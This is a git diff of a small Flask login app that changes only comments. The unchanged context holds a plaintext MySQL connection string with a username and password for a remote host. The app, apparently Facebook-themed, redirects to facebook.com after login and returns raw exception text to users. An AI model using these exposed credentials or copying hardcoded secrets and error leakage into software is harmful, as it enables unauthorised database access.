@@ -3,7 +3,7 @@ from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
-# ok
+
 # Update the database URI with the provided credentials
 app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
@@ -30,14 +30,14 @@ def login():
         user = User.query.filter_by(username=username).first()
         
         if user and check_password_hash(user.password, password):
-            # Password is correct, redirect to a logged-in page
+            # Password is correct, redirect to a logged-in page (replace with your actual redirect URL)
             return redirect('https://www.facebook.com')
         else:
             # Username or password is incorrect, handle appropriately
             return "Incorrect username or password"
 
     except Exception as e:
-        # Log the exception
+        # Log the exception (you can customize how you handle exceptions here)
         print(f"An error occurred: {str(e)}")
         return f"An error occurred while processing your request: {str(e)}", 500
 
